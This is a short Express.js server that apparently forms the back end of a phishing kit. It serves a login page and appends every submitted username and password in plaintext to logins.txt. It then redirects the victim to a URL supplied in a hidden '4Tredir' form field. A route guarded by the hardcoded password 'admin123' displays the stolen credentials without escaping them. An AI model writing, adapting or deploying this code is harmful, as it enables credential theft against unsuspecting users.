const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
// Simple password for viewing logins (change this to something secure)
const VIEW_LOGINS_PASSWORD = 'admin123';

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: false }));

// Route to view logins.txt (password protected)
app.get('/view-logins', (req, res) => {
  const { password } = req.query;
  if (password !== VIEW_LOGINS_PASSWORD) {
    return res.status(401).send('<h2>Unauthorized</h2><form method="get"><input type="password" name="password" placeholder="Password"><input type="submit" value="View Logins"></form>');
  }
  fs.readFile('logins.txt', 'utf8', (err, data) => {
    if (err) {
      return res.status(500).send('Could not read logins.txt');
    }
    res.send(`<h2>Logins</h2><pre>${data}</pre>`);
  });
});

// Serve the HTML file
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Handle form submission
app.post('/', (req, res) => {
  const { username, password, '4Tredir': redirectUrl } = req.body;
  // Log credentials to a file (append mode)
  const logLine = `Username: ${username}, Password: ${password}, Time: ${new Date().toISOString()}\n`;
  fs.appendFile('logins.txt', logLine, err => {
    if (err) console.error('Error logging credentials:', err);
  });
  // Redirect to the URL provided in the form (default to homepage if not present)
  if (redirectUrl && typeof redirectUrl === 'string' && redirectUrl.startsWith('http')) {
    res.redirect(redirectUrl);
  } else {
    res.redirect('/');
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
